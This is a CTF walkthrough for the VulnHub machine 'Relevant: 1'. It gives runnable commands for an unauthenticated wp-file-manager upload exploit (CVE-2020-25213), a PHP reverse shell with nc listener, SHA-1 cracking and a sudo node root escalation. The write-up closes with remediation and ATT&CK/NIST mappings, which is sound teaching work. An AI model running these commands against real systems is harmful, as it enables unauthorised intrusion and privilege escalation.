# Relevant: 1 — Escape the Rabbit Holes, Find the Real Path

Alright dudes!! This machine straight up baits you into a rabbit hole from the first minute. You see 2FA, you see SSH hints, and your brain goes "that's the way in." Nope. The real path hides deeper: a vulnerable WordPress plugin, a SHA-1 hash tucked in a hidden folder, and a sudo node trick that GTFOBins docs in two lines. Relevant: 1 is a lesson in staying patient and not chasing the obvious. Legit one of the best "don't trust the surface" machines on VulnHub. No cap.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | Relevant: 1 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/relevant-1,731/ |
| **Techniques** | Network recon, WordPress enumeration, wp-file-manager 6.7 RCE (unauthenticated), reverse shell, SHA-1 hash cracking, lateral movement, sudo node GTFOBin |
| **CVEs** | CVE-2020-25213 (wp-file-manager 6.7 unauthenticated file upload RCE) |
| **APT Groups** | APT41: known for exploiting vulnerable CMS plugins (including WordPress) for initial access in financial and tech sector intrusions; FIN7: leverages web application vulnerabilities for initial access leading to credential harvest and lateral movement |

---

## Attack Summary

```
netdiscover / nmap -p- -A
  |
  +-- port 80 HTTP (Apache)
        |
        +-- dirsearch -> /wordpress/
              |
              +-- nmap --script wp-enum -> wp-file-manager 6.7 (CVE-2020-25213)
                    |
                    +-- unauthenticated file upload -> PHP reverse shell -> www-data
                          |
                          +-- find hidden dir -> SHA-1 hash in /home/user/
                                |
                                +-- crack SHA-1 -> password for user 'news'
                                      |
                                      +-- su news
                                            |
                                            +-- sudo -l -> (root) NOPASSWD: /usr/bin/node
                                                  |
                                                  +-- GTFOBins node payload -> root
                                                        |
                                                        +-- /root/proof.txt
```

---

## Methodology

1. Network discovery and full-port nmap scan
2. Web content brute-force with dirsearch to locate WordPress
3. WordPress plugin enumeration to detect vulnerable wp-file-manager 6.7
4. Unauthenticated RCE via file upload (CVE-2020-25213)
5. Post-exploitation enumeration: hidden directories and password hashes
6. SHA-1 hash crack and lateral movement to user `news`
7. Privilege escalation via sudo node (GTFOBins)

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.10.0/24
# Target: 192.168.10.161

nmap -p- -A 192.168.10.161
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache 2.4.x
```

Two services. SSH is not the entry point (the box actively discourages direct SSH login with 2FA shown on the web). HTTP is the real surface.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration

Browse to `http://192.168.10.161/` first. The page shows a 2FA QR code and SSH credentials. This is a designed rabbit hole: SSH requires a key AND 2FA, and neither is reachable this way. Move past it.

Run directory brute-force:

```bash
dirsearch -u http://192.168.10.161/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# or
gobuster dir -u http://192.168.10.161/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
```

Discover `/wordpress/`. Browse to confirm a WordPress installation.

```bash
wpscan --url http://192.168.10.161/wordpress/ --enumerate p,u
```

**Alternative approach:** Use nmap wp-scripts for plugin enumeration:

```bash
nmap -p 80 --script http-wordpress-enum --script-args type=plugins 192.168.10.161
```

Either approach surfaces **wp-file-manager 6.7**, which is critically vulnerable to unauthenticated file upload and RCE (CVE-2020-25213).

**Real-world note:** wp-file-manager is installed on millions of WordPress sites. CVE-2020-25213 was exploited at scale within 24 hours of disclosure, with attackers racing to plant backdoors before site owners patched. This pattern repeats constantly with high-severity WordPress plugin CVEs: mass exploitation windows measured in hours, not days.

**MITRE ATT&CK:** T1595.003 — Active Scanning: Wordlist Scanning; T1592 — Gather Victim Host Information

---

## Step 3 — Exploit wp-file-manager (CVE-2020-25213)

The wp-file-manager plugin before 6.9 allows unauthenticated file uploads to the plugin's `lib/php/connector.minimal.php` endpoint.

```bash
# Download and use a public PoC or manual exploit
# The vulnerable endpoint accepts file uploads without authentication:
curl -F "cmd=upload" \
     -F "target=l1_Lw" \
     -F "upload[]=@shell.php;type=image/jpeg" \
     "http://192.168.10.161/wordpress/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
```

Create the PHP reverse shell first:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Edit LHOST and LPORT
nano /tmp/shell.php
```

Start listener:

```bash
nc -lvnp 4444
```

After upload, trigger the shell by browsing to:
`http://192.168.10.161/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php`

You receive a callback as `www-data`.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Unix Shell

---

## Step 4 — Shell Stabilization and Enumeration

Stabilize the shell immediately:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
# Enter twice
```

Enumerate home directories and look for interesting files:

```bash
ls -la /home/
find /home -type f -name "*.txt" -o -name "*.bak" -o -name "*.hash" 2>/dev/null
find /home -name ".*" -type f 2>/dev/null
```

In a hidden directory under one of the user's home folders, find a SHA-1 hash:

```bash
cat /home/<user>/.<hidden_dir>/hash.txt
# Example output:
# e1bca7657e522aba79a82cf4fecf0b75be3a33be
```

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1552.001 — Credentials in Files

---

## Step 5 — Hash Cracking and Lateral Movement

The hash is a 40-character hex string: SHA-1. Crack it:

```bash
# Hashcat
echo "e1bca7657e522aba79a82cf4fecf0b75be3a33be" > /tmp/sha1.hash
hashcat -m 100 /tmp/sha1.hash /usr/share/wordlists/rockyou.txt

# Or use online services (crackstation.net) for speed in a CTF context
# Cracked result: <password>
```

Use the cracked password to pivot to user `news`:

```bash
su news
# Enter cracked password
id
# uid=1001(news) gid=1001(news) groups=1001(news)
```

**MITRE ATT&CK:** T1110.002 — Brute Force: Password Cracking; T1078 — Valid Accounts

---

## Step 6 — Privilege Escalation via sudo node

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/node
```

Node.js is in the sudo NOPASSWD list. GTFOBins documents the exact payload:

```bash
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

You land as root:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/proof.txt
```

GG, no cap. Root via a runtime binary that nobody expected to be in sudoers.

**Real-world note:** Node.js in sudoers is surprisingly common in developer-heavy environments. If a developer needs to run a specific Node script as root, the lazy fix is NOPASSWD: /usr/bin/node. That grants an attacker who compromises any user with that sudo entry a free root shell in one command. The correct fix is to run the specific script with a wrapper: NOPASSWD: /usr/local/bin/run-myscript.sh and lock down that script.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control: Sudo; T1059.006 — Command and Scripting Interpreter: Python (analogous runtime abuse)

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| WordPress | wp-file-manager 6.7 vulnerable | /wordpress/ wp-content/plugins/ | CVE-2020-25213 RCE |
| SHA-1 hash | e1bca7657e522aba79a82cf4fecf0b75be3a33be (example) | /home/user/.hidden/hash.txt | hashcat -m 100 + rockyou |
| User credential | news:<cracked_password> | Hash cracked | SSH or su login |
| Root shell | uid=0(root) | sudo node GTFOBin | /root/proof.txt |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Designed rabbit hole: SSH + 2FA hint in web page | Attackers who chase decoys waste time; so do defenders who plant them without disabling the real vuln | Always confirm the actual attack surface before committing to a path |
| 2 | wp-file-manager 6.7 unauthenticated RCE (CVE-2020-25213) | This CVE was exploited globally within 24 hours of disclosure; unpatched WordPress plugins are a top initial-access vector | Maintain a WordPress plugin inventory; automate update checks; use a WAF rule blocking the vulnerable endpoint |
| 3 | SHA-1 hash stored in hidden directory | CWE-522 (Insufficiently Protected Credentials): storing any hash on disk accessible to web users is a design failure | Use PAM-integrated credential stores; never store hashes in web-reachable directories |
| 4 | sudo node (runtime binary) grants root shell | NOPASSWD sudo entries for general-purpose runtimes (node, python, perl, ruby) effectively grant root to any compromised user | Audit sudoers: restrict to specific scripts, not general runtimes; require password for sudo |
| 5 | Lateral movement via hash cracking | Password reuse and weak hashes enable lateral movement; sha1(password) with rockyou cracks in seconds on GPU | Enforce strong password policies; use bcrypt/argon2 for password storage; never SHA-1 |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | Active Scanning: Wordlist Scanning | T1595.003 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Lateral Movement | Lateral Movement | Valid Accounts | T1078 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Discovery | Discovery | File and Directory Discovery | T1083 |

---

## Remediation and Containment

### Technical Fixes

1. **Patch wp-file-manager immediately** — update to 6.9+; if unable to update, disable the plugin entirely; block `connector.minimal.php` at the WAF level
2. **Remove hashes from filesystem** — never store password hashes in web-accessible or home directories; use a credential manager
3. **Restrict sudo entries** — audit all `/etc/sudoers` and `/etc/sudoers.d/` entries; no NOPASSWD for general runtime binaries
4. **Enforce strong password hashing** — use bcrypt (cost >= 12) or argon2id for all password storage; never SHA-1 or MD5
5. **Enable WordPress auto-updates for plugins** — or use a monitoring service (Wordfence, WPScan API) to alert on new CVEs

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all WordPress installations and plugins with version tracking |
| Protect | Access Control | Restrict sudo to specific scripts; require password for all sudo |
| Protect | Data Security | Remove password hashes from filesystem; use secure credential storage |
| Detect | Anomalies and Events | Alert on uploads to WordPress plugin directories; monitor for new PHP files |
| Respond | Response Planning | Disable wp-file-manager; rotate all user credentials on host |
| Recover | Recovery Planning | Rebuild from clean snapshot; audit all accounts created post-compromise |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-6 | Least Privilege | No NOPASSWD sudo for general runtimes; principle of least privilege for sudo |
| CM-7 | Least Functionality | Disable unused WordPress plugins; remove wp-file-manager if not needed |
| IA-5 | Authenticator Management | Enforce strong password hashing; rotate credentials on all affected accounts |
| SC-28 | Protection of Info at Rest | Do not store credentials or hashes on accessible filesystem paths |
| SI-2 | Flaw Remediation | Patch WordPress plugins promptly; CVE-2020-25213 has a 24-hour exploitation window |
| SI-7 | Software and Firmware Integrity | Monitor WordPress plugin directory for unauthorized file uploads |

### CISA KEV

CVE-2020-25213 (wp-file-manager RCE) is a documented mass-exploitation vulnerability. CISA advisories (AA21-116A) note that unpatched CMS plugins are among the most commonly exploited initial access vectors. Organizations running WordPress are advised to audit plugin versions immediately.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL3 (automated scanning + patch SLA) |
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 (no NOPASSWD for runtime binaries) |
| Asset, Change, and Configuration Management (ASSET) | Manage Software | MIL2 (WordPress plugin inventory and update policy) |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening: disable unused plugins; WAF rule blocking connector.minimal.php
- **D3-OAM** — Operating System Administrative Management: audit and restrict sudoers
- **D3-HBPI** — Harden Build Pipeline Integrity: pin plugin versions; enforce update policies

---

## Final Thoughts

Relevant: 1 is a masterclass in deliberate misdirection. The 2FA QR code and SSH hints on the landing page are there specifically to waste your time. The real chain, wp-file-manager RCE to hash crack to sudo node, is clean, realistic, and exactly the kind of multi-step path you see in actual penetration tests. Every step maps to a real CVE or a real misconfiguration found in production environments.

The lesson the machine teaches: enumerate thoroughly, chase evidence not assumptions, and always check sudo before reaching for anything complex.

Big respect to the creator. This one earns its Medium rating.

Thanks guys!! (❍ᴥ❍ʋ)
